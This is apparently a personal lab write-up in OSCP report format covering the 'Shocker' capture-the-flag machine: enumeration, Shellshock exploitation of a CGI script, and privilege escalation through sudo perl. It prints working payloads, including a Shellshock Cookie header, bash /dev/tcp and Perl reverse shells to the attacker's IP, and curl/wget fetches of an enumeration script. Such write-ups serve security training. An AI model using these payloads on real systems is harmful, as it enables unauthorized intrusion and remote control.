---
title: "Offensive Security Certified Professional Exam Report"
author: ["your@mail.com", "OSID: XXXX"]
date: "2021-01-05"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "Lab Report"
lang: "en"
titlepage: true,
titlepage-rule-color: "360049"
titlepage-rule-height: 2
titlepage-background: "res/background1.pdf"
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Shocker

## Introduction

This report is about pentesting a specific machine to see if it's well secured.


## Objective
Run an analysis onto a specific machine



## Perimeter
Only this machine with specific tools
- nmap
- zap
- dirbuster
- gobuster
- nc



# High-Level Summary

## Recommendations

# Soluces
https://www.youtube.com/watch?v=IBlTdguhgfY
https://github.com/michoo/sec-learning/blob/master/soluces/1_Linux/shocker-writeup-w-o-metasploit.md


# Methodologies

## Reconnaissance
start lab
sudo openvpn michoo42.ovpn
attacking machine 10.10.14.2


**Exam Network**

- 10.129.86.186

## System IP: 10.129.86.186
### Enumeration
ping 10.129.86.186

[image](images/ping-Screenshot_2021-01-26_22-16-29.png)

```
mkdir nmap
sudo nmap -sC -sV -O -oA nmap/initial 10.129.86.186
```

    -sC: run default nmap scripts
    -sV: detect service version
    -O: detect OS
    -oA: output all formats and store in file nmap/initial

[results](images/nmap-recon-Screenshot_2021-01-26_22-22-47.png)

#### TCP
- 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

- 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)

#### UDP

#### Web Services

#### Other Services

#### Harvested Informations
Host OS:
- Ubuntu 16.04 LTS because OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 is installed only on that one

Applications:
- Apache/2.4.18
[image](images/port80-Screenshot_2021-01-26_22-24-43.png)

- OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
[image](images/port2222-Screenshot_2021-01-26_22-32-45.png)


#### Vuln Investigation

##### Check for exploits
```
searchsploit --id httpd
searchsploit --id openssh 7.2p2
```
possible cve:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3115
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1908
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8325 seems interesting... but not into ubuntu 16.04 https://nvd.nist.gov/vuln/detail/CVE-2015-8325

interesting other cve in changelog since 2.2
https://packages.ubuntu.com/xenial-updates/openssh-server

-> nothing usefull


##### Check for information on Apache
zaproxy and forced browsed (10 threads with directory-list-1.0.txt)
[results](zap-forced-browsed-Screenshot_2021-01-26_23-28-36.png)

With gobuster (10 threads)
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.86.186 -f
```
... really slow and not giving answer during investigating...


With dirbuster (10 threads) and /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[results](images/dirbuster-results.png)


NB: [other file to help to find surprises](images/dirbuster-ls.png)
NB2: dirbuster more quick with the same amount of threads but it' s buggy...

-> results http://10.129.86.186/cgi-bin/ also icons

Now investigating into fuzzing to find script file(cgi​, ​sh​, ​pl​, py) into cgi-bin
[conf](images/dirbuster-file-conf-Screenshot_2021-01-27_00-15-21.png)
[results](images/dirbuster-file-Screenshot_2021-01-27_01-47-40.png)

with gobuster (with -x find file extensiont)
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.86.186/cgi-bin/ -x sh
```

-> find http://10.129.86.186/cgi-bin/user.sh

A file is downloaded when GET
```
Content-Type: text/plain

Just an uptime test script

 00:09:06 up  1:59,  0 users,  load average: 0.00, 0.00, 0.00

```


Shell shock(old Apache, cgi-bin and a script name!) http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell

Add shellshock example with a new header:
```
Cookie: () { :;}; echo; echo "VULNERABLE"
```

it is possible with nmap script to test shellshock availability

some issue add multiple echo look at ippsec video to find why

[request](images/Penetration-request-Screenshot_2021-01-27_00-41-42.png)

[response](images/Penetration-response-Screenshot_2021-01-27_00-41-42.png)

with
```
Cookie: () { :;}; echo; /bin/sh -c whoami
```

we know we are shelly


### Penetration

starting my [reverse shell nc](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/)

```
nc -lvnp 4444
```


So now lets get forge nc header

```
Cookie: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
```
[reverse-shell](images/reverseshell-Screenshot_2021-01-27_01-15-25.png)
[id](images/id-Screenshot_2021-01-27_01-16-31.png)

[user-flag](images/userflag-Screenshot_2021-01-27_01-17-57.png)


### Post exploitation

using https://github.com/rebootuser/LinEnum should be helping into that quickly

so go to tools/linEnum and then in your attacking machine
```
python -m SimpleHTTPServer 8000
python3 -m http.server 8000
```

and on your victim machine run
```
curl http://10.10.14.2:8000/LinEnum.sh --output LinEnum.sh
wget http://10.10.14.2:8000/LinEnum.sh
```

And finally you can run it
NB: check if file is executable if problems
```
chmod +x LinEnum.sh
```

#### Host Information

#### File system

#### Running processes

#### Installed applications


#### Users & Group

#### Network

#### Scheduled job

### Privilege escalation

*Additional Priv Esc info*
```
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl


```

So run bash by using perl as root without password

**Vulnerability Exploited:**
```
sudo /usr/bin/perl -e 'exec "/bin/sh"'
```

Or run a new reverse shell with perl
```
perl -e 'use Socket;$i="10.10.14.2";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Vulnerability Fix:**
-> change Shelly grants no more running script framework as root without password!!


**Severity:**
Low it's configuration issue not a vulnerability

**Exploit Code:**
N/A

### Goodies

#### Hashes

#### Passwords

#### Proof/Flags/Other

**Proof Screenshot Here:**
[user-flag](images/userflag-Screenshot_2021-01-27_01-17-57.png)
[root-flag](images/rootflag-Screenshot_2021-01-27_01-23-26.png)

**Proof.txt Contents:**
For Shelly:
flag is 828db557c7b31eb08beda38250cb----

For root:
flag is 4ae1758708343c4769dd45ff0ac87----


## Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

## House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting trophies from the exam network was completed, I removed all user accounts and passwords as well as the Meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.

# Detailed Recommandations

## Technical

- waf like akamai or cloudflare or into apache web server (mod_security)
- update your system Ubuntu 16.04... we are in 2021!
- [Interesting link to put regex to filtering](https://resources.infosecinstitute.com/topic/penetration-testing-of-web-services-with-cgi-support/)

## Governance
- better grant management

## Blue team
- SIEM log cmd shell. And with rules like if nc

# Additional Items

## Appendix - Proof and Local Contents

IP (Hostname) | user.txt Contents | root.txt Contents
--------------|--------------------|-------------------
10.129.86.186   | 828db557c7b31eb08beda38250cb----          | 4ae1758708343c4769dd45ff0ac8----
